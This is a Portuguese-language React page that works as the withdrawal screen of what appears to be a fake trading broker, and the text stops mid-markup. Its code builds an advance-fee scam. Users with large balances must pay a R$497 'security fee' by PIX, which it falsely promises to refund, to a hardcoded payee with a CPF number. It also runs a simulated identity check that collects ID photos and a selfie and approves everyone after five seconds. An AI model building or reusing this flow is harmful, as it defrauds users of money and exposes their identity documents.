"use client"

import { useState, useEffect, useRef } from "react"
import { CheckCircle, Camera, Upload, X, Loader2 } from "lucide-react"
import { getUserBalance, updateUserBalance } from "@/lib/actions/balance"

export default function SaquePage() {
  const [withdrawalAmount, setWithdrawalAmount] = useState("200")
  const [pixKey, setPixKey] = useState("")
  const [agreedToTerms, setAgreedToTerms] = useState(false)
  const [balance, setBalance] = useState(0)
  const [withdrawalSuccess, setWithdrawalSuccess] = useState(false)
  const [showKycModal, setShowKycModal] = useState(false)
  const [kycStep, setKycStep] = useState("intro")
  const [docFront, setDocFront] = useState<File | null>(null)
  const [docBack, setDocBack] = useState<File | null>(null)
  const [showCamera, setShowCamera] = useState(false)
  const [selfieCapture, setSelfieCapture] = useState<string | null>(null)
  const [isLoadingBalance, setIsLoadingBalance] = useState(true)
  const [isProcessing, setIsProcessing] = useState(false)
  const [isVerifyingKyc, setIsVerifyingKyc] = useState(false)
  const [withdrawalHistory, setWithdrawalHistory] = useState<any[]>([])
  
  // Estados para taxa de segurança com PIX
  const [showSecurityFeePixModal, setShowSecurityFeePixModal] = useState(false)
  const [securityFeePixData, setSecurityFeePixData] = useState<any>(null)
  const [securityFeeTxid, setSecurityFeeTxid] = useState("")
  const [isGeneratingSecurityFeePix, setIsGeneratingSecurityFeePix] = useState(false)
  
  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  
  const predefinedAmounts = [200, 1000, 2000, 100, 500, 1500, 4000]
  const SECURITY_FEE_AMOUNT = 497

  // Buscar saldo do usuário ao carregar a página
  useEffect(() => {
    const fetchBalance = async () => {
      try {
        setIsLoadingBalance(true)
        const result = await getUserBalance()
        
        if (result.success && result.data) {
          setBalance(result.data.balance)
        }
      } catch (err) {
        console.error("Erro ao buscar saldo:", err)
      } finally {
        setIsLoadingBalance(false)
      }
    }

    fetchBalance()
    
    // Carregar histórico de saques do localStorage
    const loadWithdrawalHistory = () => {
      try {
        const history = localStorage.getItem("withdrawalHistory")
        if (history) {
          setWithdrawalHistory(JSON.parse(history))
        }
      } catch (err) {
        console.error("Erro ao carregar histórico:", err)
      }
    }
    
    loadWithdrawalHistory()
  }, [])

  const checkKycStatus = () => {
    const kycVerified = localStorage.getItem("kycVerified")
    return kycVerified === "true"
  }

  const checkSecurityFeePaid = () => {
    const feePaid = localStorage.getItem("securityFeePaid")
    return feePaid === "true"
  }

  const handleAmountSelect = (amount: number) => {
    setWithdrawalAmount(amount.toString())
  }

  const showToast = (title: string, description: string, variant: "default" | "destructive" = "default") => {
    alert(`${title}: ${description}`)
  }

  const handleWithdrawal = () => {
    const withdrawalValue = Number.parseFloat(withdrawalAmount)

    if (!withdrawalAmount || !pixKey || !agreedToTerms) {
      showToast("Campos obrigatórios", "Por favor, preencha todos os campos obrigatórios.", "destructive")
      return
    }

    if (withdrawalValue <= 0) {
      showToast("Valor inválido", "O valor do saque deve ser maior que zero.", "destructive")
      return
    }

    if (withdrawalValue > balance) {
      showToast("Saldo insuficiente", `Seu saldo atual é R$ ${balance.toFixed(2)}`, "destructive")
      return
    }

    if (withdrawalValue < 10) {
      showToast("Valor mínimo", "O valor mínimo para saque é R$ 10,00", "destructive")
      return
    }

    if (!checkKycStatus()) {
      setShowKycModal(true)
      setKycStep("intro")
      return
    }

    if (balance >= 10000 && !checkSecurityFeePaid()) {
      setShowKycModal(true)
      setKycStep("security-fee")
      return
    }

    processWithdrawal(withdrawalValue)
  }

  const processWithdrawal = async (amount: number) => {
    try {
      setIsProcessing(true)
      
      const result = await updateUserBalance({
        balance: amount,
        operation: "subtract"
      })

      if (result.success && result.data) {
        setBalance(result.data.balance)
        
        // Salvar no histórico
        const newWithdrawal = {
          id: Date.now(),
          amount: amount,
          pixKey: pixKey,
          date: new Date().toISOString(),
          status: "pending"
        }
        
        const history = localStorage.getItem("withdrawalHistory")
        const currentHistory = history ? JSON.parse(history) : []
        const updatedHistory = [newWithdrawal, ...currentHistory]
        
        localStorage.setItem("withdrawalHistory", JSON.stringify(updatedHistory))
        setWithdrawalHistory(updatedHistory)
        
        setWithdrawalSuccess(true)
      } else {
        showToast("Erro", "Não foi possível processar o saque. Tente novamente.", "destructive")
      }
    } catch (err) {
      console.error("Erro ao processar saque:", err)
      showToast("Erro", "Houve um erro ao processar o saque. Tente novamente.", "destructive")
    } finally {
      setIsProcessing(false)
    }
  }

  const generateSecurityFeePix = async () => {
    setIsGeneratingSecurityFeePix(true)
    
    try {
      const response = await fetch("https://casperspay.com/api/pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "token": process.env.NEXT_PUBLIC_CASPERS_API_KEY || ""
        },
        body: JSON.stringify({
          action: "criar",
          nome: "nicolas",
          cpf: "48402124062",
          valor: SECURITY_FEE_AMOUNT.toString()
        })
      })

      if (!response.ok) {
        throw new Error("Erro ao gerar PIX")
      }

      const data = await response.json()
      setSecurityFeePixData(data)
      setSecurityFeeTxid(data.txid)
      setShowSecurityFeePixModal(true)
      setShowKycModal(false)
    } catch (err) {
      showToast("Erro", "Erro ao gerar PIX para taxa de segurança. Tente novamente.", "destructive")
      console.error("Error creating security fee PIX:", err)
    } finally {
      setIsGeneratingSecurityFeePix(false)
    }
  }

  const copySecurityFeePixCode = async () => {
    const pixCode = securityFeePixData?.pixCopiaECola || ""
    try {
      await navigator.clipboard.writeText(pixCode)
      showToast("Copiado", "Código PIX copiado com sucesso!")
    } catch (err) {
      console.error("Failed to copy PIX code:", err)
    }
  }

  const checkSecurityFeePaymentStatus = async (txidToCheck: string) => {
    try {
      const response = await fetch("https://casperspay.com/api/pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "token": process.env.NEXT_PUBLIC_CASPERS_API_KEY || ""
        },
        body: JSON.stringify({
          action: "verificar",
          txid: txidToCheck
        })
      })

      if (!response.ok) {
        throw new Error("Erro ao verificar pagamento")
      }

      const data = await response.json()
      
      if (data.status === "CONCLUIDA" || data.pixStatus === "CONCLUIDA") {
        localStorage.setItem("securityFeePaid", "true")
        localStorage.setItem("securityFeePaidDate", new Date().toISOString())
        
        setShowSecurityFeePixModal(false)
        setSecurityFeeTxid("")
        setSecurityFeePixData(null)
        
        showToast("Taxa Paga", "Taxa de segurança paga com sucesso! Processando seu saque...")
        
        const withdrawalValue = Number.parseFloat(withdrawalAmount)
        await processWithdrawal(withdrawalValue)
      }
    } catch (err) {
      console.error("Error checking security fee payment status:", err)
    }
  }

  useEffect(() => {
    let timeout: NodeJS.Timeout
    let isActive = true

    const verifySecurityFeePayment = async () => {
      if (!isActive || !securityFeeTxid) return
      
      await checkSecurityFeePaymentStatus(securityFeeTxid)
      
      if (isActive && showSecurityFeePixModal && securityFeeTxid) {
        timeout = setTimeout(verifySecurityFeePayment, 3000)
      }
    }

    if (showSecurityFeePixModal && securityFeeTxid) {
      verifySecurityFeePayment()
    }

    return () => {
      isActive = false
      if (timeout) {
        clearTimeout(timeout)
      }
    }
  }, [showSecurityFeePixModal, securityFeeTxid])

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
    const file = e.target.files?.[0]
    if (file) {
      if (side === "front") {
        setDocFront(file)
      } else {
        setDocBack(file)
      }
    }
  }

  const startCamera = async () => {
    try {
      setShowCamera(true)
      // Aguardar um pouco para o vídeo estar renderizado
      await new Promise(resolve => setTimeout(resolve, 100))
      
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: 1280, height: 720 } 
      })
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream
        streamRef.current = stream
        // Aguardar o vídeo carregar
        await videoRef.current.play()
      }
    } catch (err) {
      console.error("Erro ao acessar câmera:", err)
      showToast("Erro", "Não foi possível acessar a câmera. Verifique as permissões.", "destructive")
      setShowCamera(false)
    }
  }

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop())
      streamRef.current = null
    }
    setShowCamera(false)
  }

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current) {
      const video = videoRef.current
      const canvas = canvasRef.current
      const context = canvas.getContext("2d")
      
      if (context && video.readyState === video.HAVE_ENOUGH_DATA) {
        // Definir tamanho do canvas igual ao vídeo
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        
        // Desenhar o frame atual do vídeo no canvas
        context.drawImage(video, 0, 0, canvas.width, canvas.height)
        
        // Converter para imagem
        const imageData = canvas.toDataURL("image/jpeg", 0.95)
        setSelfieCapture(imageData)
        
        // Parar a câmera
        stopCamera()
      } else {
        showToast("Erro", "Aguarde a câmera carregar completamente", "destructive")
      }
    }
  }

  const completeKyc = async () => {
    if (!docFront || !docBack || !selfieCapture) {
      showToast("Documentos incompletos", "Por favor, envie todos os documentos necessários", "destructive")
      return
    }

    // Iniciar verificação com spinner
    setIsVerifyingKyc(true)
    
    // Aguardar 5 segundos simulando verificação
    await new Promise(resolve => setTimeout(resolve, 5000))
    
    // Salvar status de KYC
    localStorage.setItem("kycVerified", "true")
    localStorage.setItem("kycDate", new Date().toISOString())
    
    setIsVerifyingKyc(false)
    setShowKycModal(false)
    
    showToast("Verificação completa", "Seus documentos foram verificados com sucesso!")
    
    // Verificar se precisa pagar taxa de segurança
    if (balance >= 10000 && !checkSecurityFeePaid()) {
      setTimeout(() => {
        setShowKycModal(true)
        setKycStep("security-fee")
      }, 500)
      return
    }
    
    // Processar saque
    const withdrawalValue = Number.parseFloat(withdrawalAmount)
    processWithdrawal(withdrawalValue)
  }

  const nextKycStep = async () => {
    if (kycStep === "intro") {
      setKycStep("documents")
    } else if (kycStep === "documents") {
      if (!docFront || !docBack) {
        showToast("Documentos obrigatórios", "Por favor, envie frente e verso do documento", "destructive")
        return
      }
      setKycStep("selfie")
      // Aguardar a transição antes de iniciar a câmera
      setTimeout(() => {
        startCamera()
      }, 300)
    }
  }

  useEffect(() => {
    return () => {
      stopCamera()
    }
  }, [])

  return (
    <div className="min-h-screen bg-white text-black">
      <div className="container mx-auto px-4 py-8">
         <div className="mb-6">
          <div className="text-sm text-gray-500">
            <span className="hover:text-black cursor-pointer transition-colors">Método de saque</span>
            <span className="mx-2">›</span>
            <span className="text-black font-medium">PIX</span>
          </div>
        </div>

        <div className="max-w-2xl mx-auto mb-6">
          <div className="bg-gradient-to-r from-black to-gray-800 text-white p-6 rounded-xl shadow-lg">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-300 text-sm font-medium mb-1">Saldo Disponível</p>
                <p className="text-3xl font-bold">
                  {isLoadingBalance ? (
                    <span className="animate-pulse">Carregando...</span>
                  ) : (
                    `R$ ${balance.toFixed(2)}`
                  )}
                </p>
              </div>
              <div className="w-16 h-16 bg-white/10 rounded-full flex items-center justify-center">
                <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z"/>
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd"/>
                </svg>
              </div>
            </div>
          </div>
        </div>

       
        <div className="max-w-2xl mx-auto">
          {withdrawalSuccess ? (
            <>
              <div className="bg-white border-2 border-gray-200 rounded-xl p-8 text-center shadow-sm">
                <div className="flex justify-center mb-4">
                  <CheckCircle className="w-16 h-16 text-green-600" />
                </div>
                <h2 className="text-3xl font-bold text-black mb-3">Solicitação de Saque Enviada!</h2>
                <p className="text-gray-600 mb-2">
                  Sua solicitação de saque de <span className="text-black font-bold">R$ {withdrawalAmount}</span> foi enviada com sucesso.
                </p>
                <p className="text-gray-600 mb-2">
                  O valor será creditado na chave PIX <span className="text-black font-bold">{pixKey}</span> em até 72 horas.
                </p>
                <p className="text-gray-600 mb-6">
                  Seu novo saldo é: <span className="text-black font-bold">R$ {balance.toFixed(2)}</span>
                </p>
                <button
                  onClick={() => setWithdrawalSuccess(false)}
                  className="py-3 px-8 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
                >
                  Fazer Novo Saque
                </button>
              </div>
            </>
          ) : (
            <div className="bg-white border-2 border-gray-200 rounded-xl p-8 mb-6 shadow-sm">
              <div className="flex items-center gap-4 mb-6">
                <div className="w-14 h-14 bg-black rounded-xl flex items-center justify-center overflow-hidden p-2.5">
                  <img
                    src="https://aurumtraderbroker.site/pix.png"
                    alt="PIX Logo"
                    className="w-full h-full object-contain brightness-0 invert"
                  />
                </div>
                <h2 className="text-3xl font-bold text-black">PIX</h2>
              </div>

              <div className="bg-blue-50 border-2 border-blue-200 rounded-xl p-4 mb-6">
                <p className="text-blue-800 text-sm font-medium">
                  Após a solicitação, o valor do saque será creditado em sua conta em até 72 horas.
                </p>
              </div>

              <div className="grid md:grid-cols-2 gap-6">
                <div>
                  <label className="block text-black font-semibold mb-3">Valor do saque</label>
                  <input
                    type="text"
                    value={`R$ ${withdrawalAmount}`}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\d]/g, "")
                      setWithdrawalAmount(value)
                    }}
                    className="w-full p-4 bg-white border-2 border-gray-200 rounded-lg text-black focus:border-black focus:outline-none transition-colors font-medium"
                  />

                  <div className="grid grid-cols-4 gap-2 mt-3">
                    {predefinedAmounts.map((amount) => (
                      <button
                        key={amount}
                        onClick={() => handleAmountSelect(amount)}
                        className={`p-3 rounded-lg text-xs font-bold transition-all ${
                          withdrawalAmount === amount.toString()
                            ? "bg-black text-white shadow-md"
                            : "bg-white border-2 border-gray-200 text-black hover:border-black"
                        }`}
                      >
                        R$ {amount.toLocaleString()}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-black font-semibold mb-3">Chave PIX para receber</label>
                  <input
                    type="text"
                    value={pixKey}
                    onChange={(e) => setPixKey(e.target.value)}
                    placeholder="CPF, e-mail, telefone..."
                    className="w-full p-4 bg-white border-2 border-gray-200 rounded-lg text-black placeholder-gray-400 focus:border-black focus:outline-none transition-colors font-medium"
                  />
                </div>
              </div>

              <div className="mt-6">
                <label className="flex items-center gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={agreedToTerms}
                    onChange={(e) => setAgreedToTerms(e.target.checked)}
                    className="w-5 h-5 accent-black cursor-pointer"
                  />
                  <span className="text-gray-600 text-sm">Eu, por meio deste, aceito os Termos e Condições</span>
                </label>
              </div>

              <div className="flex gap-4 mt-8">
                <button
                  onClick={() => window.history.back()}
                  className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
                  disabled={isProcessing}
                >
                  Voltar
                </button>
                <button
                  onClick={handleWithdrawal}
                  disabled={isProcessing}
                  className={`flex-1 py-3 px-6 rounded-lg font-bold transition-all shadow-md ${
                    isProcessing
                      ? "bg-gray-400 text-white cursor-not-allowed"
                      : "bg-black text-white hover:bg-gray-800"
                  }`}
                >
                  {isProcessing ? "Processando..." : "Confirmar Saque"}
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Histórico de Saques */}
        {withdrawalHistory.length > 0 && (
          <div className="max-w-2xl mx-auto mt-8">
            <div className="bg-white border-2 border-gray-200 rounded-xl p-8 shadow-sm">
              <h2 className="text-2xl font-bold text-black mb-6">Histórico de Saques</h2>
              
              <div className="space-y-4">
                {withdrawalHistory.map((withdrawal) => (
                  <div 
                    key={withdrawal.id}
                    className="flex items-center justify-between p-4 bg-gray-50 rounded-lg border border-gray-200 hover:border-gray-300 transition-all"
                  >
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-lg font-bold text-black">
                          R$ {Number(withdrawal.amount).toFixed(2)}
                        </span>
                        <span className={`text-xs font-semibold px-2 py-1 rounded-full ${
                          withdrawal.status === "pending" 
                            ? "bg-yellow-100 text-yellow-800" 
                            : withdrawal.status === "completed"
                            ? "bg-green-100 text-green-800"
                            : "bg-gray-100 text-gray-800"
                        }`}>
                          {withdrawal.status === "pending" ? "Pendente" : "Concluído"}
                        </span>
                      </div>
                      <p className="text-sm text-gray-600">
                        Chave PIX: <span className="font-medium text-black">{withdrawal.pixKey}</span>
                      </p>
                      <p className="text-xs text-gray-500 mt-1">
                        {new Date(withdrawal.date).toLocaleString("pt-BR", {
                          day: "2-digit",
                          month: "2-digit",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit"
                        })}
                      </p>
                    </div>
                    
                    <div className="w-10 h-10 bg-black rounded-full flex items-center justify-center">
                      <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                  </div>
                ))}
              </div>
              
              {withdrawalHistory.length > 3 && (
                <div className="mt-4 text-center">
                  <button className="text-sm text-gray-600 hover:text-black font-medium transition-colors">
                    Ver todos ({withdrawalHistory.length} saques)
                  </button>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Histórico de Saques - Também aparece após sucesso */}
        {withdrawalSuccess && withdrawalHistory.length > 0 && (
          <div className="max-w-2xl mx-auto mt-6">
            <div className="bg-white border-2 border-gray-200 rounded-xl p-8 shadow-sm">
              <h2 className="text-2xl font-bold text-black mb-6">Histórico de Saques</h2>
              
              <div className="space-y-4">
                {withdrawalHistory.slice(0, 5).map((withdrawal) => (
                  <div 
                    key={withdrawal.id}
                    className="flex items-center justify-between p-4 bg-gray-50 rounded-lg border border-gray-200 hover:border-gray-300 transition-all"
                  >
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-lg font-bold text-black">
                          R$ {Number(withdrawal.amount).toFixed(2)}
                        </span>
                        <span className={`text-xs font-semibold px-2 py-1 rounded-full ${
                          withdrawal.status === "pending" 
                            ? "bg-yellow-100 text-yellow-800" 
                            : withdrawal.status === "completed"
                            ? "bg-green-100 text-green-800"
                            : "bg-gray-100 text-gray-800"
                        }`}>
                          {withdrawal.status === "pending" ? "Pendente" : "Concluído"}
                        </span>
                      </div>
                      <p className="text-sm text-gray-600">
                        Chave PIX: <span className="font-medium text-black">{withdrawal.pixKey}</span>
                      </p>
                      <p className="text-xs text-gray-500 mt-1">
                        {new Date(withdrawal.date).toLocaleString("pt-BR", {
                          day: "2-digit",
                          month: "2-digit",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit"
                        })}
                      </p>
                    </div>
                    
                    <div className="w-10 h-10 bg-black rounded-full flex items-center justify-center">
                      <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                  </div>
                ))}
              </div>
              
              {withdrawalHistory.length > 5 && (
                <div className="mt-4 text-center">
                  <p className="text-sm text-gray-600 font-medium">
                    Mostrando 5 de {withdrawalHistory.length} saques
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

        {showKycModal && (
          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
            <div className="bg-white rounded-2xl p-8 max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl">
              {isVerifyingKyc ? (
                <div className="text-center py-12">
                  <div className="flex justify-center mb-6">
                    <Loader2 className="w-20 h-20 text-black animate-spin" />
                  </div>
                  <h2 className="text-2xl font-bold text-black mb-3">Verificando seus documentos...</h2>
                  <p className="text-gray-600">Isso pode levar alguns instantes</p>
                </div>
              ) : (
                <>
                  {kycStep === "security-fee" && (
                    <>
                      <div className="flex items-center justify-between mb-8">
                        <div className="flex items-center gap-3">
                          <div className="w-14 h-14 bg-black rounded-full flex items-center justify-center">
                            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                          </div>
                          <h2 className="text-2xl font-bold text-black">Taxa de Segurança Anti-Fraude</h2>
                        </div>
                        <button 
                          onClick={() => setShowKycModal(false)} 
                          className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
                        >
                          <X size={24} />
                        </button>
                      </div>

                      <div className="bg-gray-100 border-2 border-gray-300 rounded-xl p-6 mb-6">
                        <div className="text-center mb-4">
                          <p className="text-gray-700 text-lg mb-2 leading-relaxed">
                            Para garantir sua segurança e evitar fraudes, é necessário pagar uma taxa única de:
                          </p>
                          <div className="bg-white border-2 border-black rounded-lg py-4 px-6 inline-block">
                            <span className="text-black font-bold text-4xl">R$ {SECURITY_FEE_AMOUNT.toFixed(2)}</span>
                          </div>
                        </div>
                      </div>

                      <div className="bg-gray-50 border-2 border-gray-200 rounded-xl p-6 mb-8">
                        <div className="flex items-start gap-3">
                          <div className="w-6 h-6 bg-black rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                            <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                            </svg>
                          </div>
                          <p className="text-gray-700 text-base leading-relaxed">
                            <strong className="text-black">Importante:</strong> O valor da taxa será devolvido junto com o valor do seu saque, direto no seu PIX.
                          </p>
                        </div>
                      </div>

                      <button
                        onClick={generateSecurityFeePix}
                        disabled={isGeneratingSecurityFeePix}
                        className={`w-full py-4 px-6 rounded-xl font-bold transition-all shadow-lg mb-4 flex items-center justify-center gap-2 text-lg ${
                          isGeneratingSecurityFeePix
                            ? "bg-gray-400 text-white cursor-not-allowed"
                            : "bg-black text-white hover:bg-gray-800"
                        }`}
                      >
                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                        </svg>
                        {isGeneratingSecurityFeePix ? "GERANDO PIX..." : "PAGAR TAXA E SACAR"}
                      </button>

                      <button
                        onClick={() => setShowKycModal(false)}
                        className="w-full py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-xl hover:border-black transition-all"
                      >
                        Cancelar
                      </button>
                    </>
                  )}

                  {kycStep === "intro" && (
                    <>
                      <div className="text-center mb-6">
                        <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                          <svg className="w-10 h-10 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                          </svg>
                        </div>
                        <h2 className="text-3xl font-bold text-black mb-3">Verificação de Identidade</h2>
                        <p className="text-gray-600 mb-6">
                          Para garantir a segurança da sua conta e cumprir regulamentações, precisamos verificar sua identidade antes do primeiro saque.
                        </p>
                      </div>

                      <div className="space-y-4 mb-8">
                        <div className="flex items-start gap-3 p-4 bg-gray-50 rounded-lg">
                          <div className="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center flex-shrink-0 font-bold">1</div>
                          <div>
                            <h3 className="font-bold text-black mb-1">Documento de Identidade</h3>
                            <p className="text-sm text-gray-600">Envie fotos da frente e verso do seu RG ou CNH</p>
                          </div>
                        </div>
                        
                        <div className="flex items-start gap-3 p-4 bg-gray-50 rounded-lg">
                          <div className="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center flex-shrink-0 font-bold">2</div>
                          <div>
                            <h3 className="font-bold text-black mb-1">Selfie de Verificação</h3>
                            <p className="text-sm text-gray-600">Tire uma foto do seu rosto para confirmar sua identidade</p>
                          </div>
                        </div>
                      </div>

                      <div className="flex gap-4">
                        <button
                          onClick={() => setShowKycModal(false)}
                          className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
                        >
                          Cancelar
                        </button>
                        <button
                          onClick={nextKycStep}
                          className="flex-1 py-3 px-6 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
                        >
                          Iniciar Verificação
                        </button>
                      </div>
                    </>
                  )}

                  {kycStep === "documents" && (
                    <>
                      <div className="flex items-center justify-between mb-6">
                        <h2 className="text-2xl font-bold text-black">Enviar Documentos</h2>
                        <button 
                          onClick={() => setShowKycModal(false)} 
                          className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
                        >
                          <X size={24} />
                        </button>
                      </div>

                      <p className="text-gray-600 mb-6">
                        Envie fotos claras da frente e verso do seu documento de identidade (RG ou CNH)
                      </p>

                      <div className="grid md:grid-cols-2 gap-6 mb-8">
                        <div>
                          <label className="block text-black font-semibold mb-3">Frente do Documento</label>
                          <div className="relative">
                            <input
                              type="file"
                              accept="image/*"
                              onChange={(e) => handleFileUpload(e, "front")}
                              className="hidden"
                              id="docFront"
                            />
                            <label
                              htmlFor="docFront"
                              className={`flex flex-col items-center justify-center w-full h-48 border-2 border-dashed rounded-xl cursor-pointer transition-all ${
                                docFront ? "border-green-500 bg-green-50" : "border-gray-300 bg-gray-50 hover:bg-gray-100"
                              }`}
                            >
                              {docFront ? (
                                <div className="text-center">
                                  <CheckCircle className="w-12 h-12 text-green-600 mx-auto mb-2" />
                                  <p className="text-sm font-medium text-green-700">{docFront.name}</p>
                                </div>
                              ) : (
                                <div className="text-center">
                                  <Upload className="w-12 h-12 text-gray-400 mx-auto mb-2" />
                                  <p className="text-sm font-medium text-gray-600">Clique para enviar</p>
                                </div>
                              )}
                            </label>
                          </div>
                        </div>

                        <div>
                          <label className="block text-black font-semibold mb-3">Verso do Documento</label>
                          <div className="relative">
                            <input
                              type="file"
                              accept="image/*"
                              onChange={(e) => handleFileUpload(e, "back")}
                              className="hidden"
                              id="docBack"
                            />
                            <label
                              htmlFor="docBack"
                              className={`flex flex-col items-center justify-center w-full h-48 border-2 border-dashed rounded-xl cursor-pointer transition-all ${
                                docBack ? "border-green-500 bg-green-50" : "border-gray-300 bg-gray-50 hover:bg-gray-100"
                              }`}
                            >
                              {docBack ? (
                                <div className="text-center">
                                  <CheckCircle className="w-12 h-12 text-green-600 mx-auto mb-2" />
                                  <p className="text-sm font-medium text-green-700">{docBack.name}</p>
                                </div>
                              ) : (
                                <div className="text-center">
                                  <Upload className="w-12 h-12 text-gray-400 mx-auto mb-2" />
                                  <p className="text-sm font-medium text-gray-600">Clique para enviar</p>
                                </div>
                              )}
                            </label>
                          </div>
                        </div>
                      </div>

                      <div className="flex gap-4">
                        <button
                          onClick={() => setKycStep("intro")}
                          className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
                        >
                          Voltar
                        </button>
                        <button
                          onClick={nextKycStep}
                          className="flex-1 py-3 px-6 bg-black text-white font-bold rounded-lg hover:bg-gray-800 transition-all shadow-md"
                        >
                          Próximo: Selfie
                        </button>
                      </div>
                    </>
                  )}

                  {kycStep === "selfie" && (
                    <>
                      <div className="flex items-center justify-between mb-6">
                        <h2 className="text-2xl font-bold text-black">Selfie de Verificação</h2>
                        <button 
                          onClick={() => {
                            stopCamera()
                            setShowKycModal(false)
                          }} 
                          className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
                        >
                          <X size={24} />
                        </button>
                      </div>

                      <p className="text-gray-600 mb-6">
                        Tire uma selfie clara do seu rosto para confirmar sua identidade
                      </p>

                      <div className="mb-6">
                        {!selfieCapture ? (
                          <div className="relative bg-black rounded-xl overflow-hidden">
                            {showCamera ? (
                              <>
                                <video
                                  ref={videoRef}
                                  autoPlay
                                  playsInline
                                  className="w-full h-96 object-cover"
                                />
                                <div className="absolute inset-0 border-4 border-white/30 rounded-xl pointer-events-none">
                                  <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-80 border-4 border-white rounded-full"></div>
                                </div>
                                <button
                                  onClick={capturePhoto}
